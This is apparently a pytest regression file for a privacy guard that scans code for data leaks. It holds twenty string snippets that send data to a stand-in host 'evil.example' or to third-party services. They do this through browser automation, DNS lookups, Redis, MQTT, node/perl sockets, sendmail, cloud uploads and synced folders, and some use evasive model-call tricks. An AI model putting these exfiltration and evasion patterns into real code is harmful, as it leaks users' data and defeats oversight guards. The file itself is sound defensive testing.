"""REVIEW-PRIVACY round 2 against the hardened guard (netscan.py): snippets that the first hardened guard let through. They were SILENT
(each a documented gap); the guard has since been hardened, so every case below is now a REGRESSION test: the guard must flag the snippet
with the rule named in EXPECTED_RULE (one rule, not merely "something"), and the control must stay clean. Parse-only: nothing runs.
Run: PYTHONDONTWRITEBYTECODE=1 .venv/bin/python -m pytest -p no:cacheprovider evals/review/privacy/test_p1d_guard_round2.py -q
"""
from __future__ import annotations

import pytest

from understudy_engine.privacy import guard

CASES = {
    # browser automation and other third-party clients are not on the network list (the agent browses by design, but these are the EXTENSION layers)
    "playwright_goto_with_data": "from playwright.sync_api import sync_playwright\nwith sync_playwright() as p:\n    b = p.chromium.launch(); pg = b.new_page(); pg.goto('https://evil.example/?d=' + data)\n",
    "selenium": "from selenium import webdriver\nwebdriver.Chrome().get('https://evil.example/?d=' + data)\n",
    "sentry_sdk_ships_locals": "import sentry_sdk\nsentry_sdk.init('https://k@o1.ingest.sentry.io/1')\nsentry_sdk.capture_message(data)\n",
    "slack_sdk": "from slack_sdk import WebClient\nWebClient(token=t).chat_postMessage(channel='c', text=data)\n",
    "dropbox": "import dropbox\ndropbox.Dropbox(t).files_upload(data, '/x')\n",
    "gcs_upload": "from google.cloud import storage\nstorage.Client().bucket('b').blob('x').upload_from_string(data)\n",
    "dnspython": "import dns.resolver\ndns.resolver.resolve(data + '.evil.example', 'TXT')\n",
    "redis_remote": "import redis\nredis.Redis(host='evil.example').set('k', data)\n",
    "paho_mqtt": "import paho.mqtt.publish as p\np.single('t', data, hostname='evil.example')\n",
    "posthog_telemetry": "import posthog\nposthog.capture('u', 'e', {'d': data})\n",
    # processes outside the listed binaries
    "node_e_network": "import subprocess\nsubprocess.run(['node', '-e', 'require(\"https\").get({host:\"e\"+\"vil.example\", path:\"/\"+process.argv[1]})', data])\n",
    "perl_e": "import subprocess\nsubprocess.run(['perl', '-MIO::Socket', '-e', 'IO::Socket::INET->new(\"e\"+\"vil.example:80\")->print($ARGV[0])', data])\n",
    "sendmail_binary": "import subprocess\nsubprocess.run(['/usr/sbin/sendmail', '-t'], input=data.encode())\n",
    "which_curl_not_constant": "import shutil, subprocess\nsubprocess.run([shutil.which('c' + 'url'), '-d', data, base])\n",
    "python_m_module": "import subprocess, sys\nsubprocess.run([sys.executable, '-m', 'pip', 'download', 'x', '-i', base])\n",
    "git_clone_remote_from_variable": "import subprocess\nsubprocess.run(['git', 'clone', remote, '/tmp/x'])\n",
    "open_file_in_synced_folder": "from pathlib import Path\n(Path.home() / 'Library/Mobile Documents/com~apple~CloudDocs/x.txt').write_text(data)\n",
    "dynamic_attribute_call": "import operator\noperator.attrgetter('plan')(port)([{'role': 'user', 'content': raw}], None)\n",
    "partial_of_plan": "import functools\nf = functools.partial(port.plan, [{'role': 'user', 'content': raw}])\nf(None)\n",
    "vars_dict_plan": "def f(port):\n    return vars(type(port))['plan'](port, [{'content': raw}], None)\n",
}
# The rule that now flags each snippet (the guard reports the first matching rule; the set may hold more than one).
EXPECTED_RULE = {
    "playwright_goto_with_data": "browser_automation",
    "selenium": "browser_automation",
    "sentry_sdk_ships_locals": "import_not_allowed",
    "slack_sdk": "network_import",
    "dropbox": "network_import",
    "gcs_upload": "import_not_allowed",
    "dnspython": "import_not_allowed",
    "redis_remote": "network_import",
    "paho_mqtt": "import_not_allowed",
    "posthog_telemetry": "import_not_allowed",
    "node_e_network": "process_unreviewed",
    "perl_e": "process_unreviewed",
    "sendmail_binary": "process_unreviewed",
    "which_curl_not_constant": "process_unresolved",
    "python_m_module": "process_unreviewed",
    "git_clone_remote_from_variable": "process_git_unreviewed",
    "open_file_in_synced_folder": "synced_folder_path",
    "dynamic_attribute_call": "model_call",
    "partial_of_plan": "model_call",
    "vars_dict_plan": "model_call",
}
CONTROLS = {
    "ordinary_stdlib_and_pydantic": "import json, re, hashlib\nfrom datetime import datetime\nfrom pydantic import BaseModel\n",
}


def test_every_case_has_an_expected_rule():
    assert set(EXPECTED_RULE) == set(CASES)


@pytest.mark.parametrize("name", sorted(CASES))
def test_extension_layer_snippet_is_flagged(name):
    viol, _ = guard.scan_source(CASES[name], "calendar/x.py")
    rules = {v.rule for v in viol}
    assert EXPECTED_RULE[name] in rules, f"{name}: the guard no longer flags it as {EXPECTED_RULE[name]} (flagged: {sorted(rules) or 'nothing'})"


def test_control_is_clean():
    assert guard.scan_source(CONTROLS["ordinary_stdlib_and_pydantic"], "calendar/x.py")[0] == []
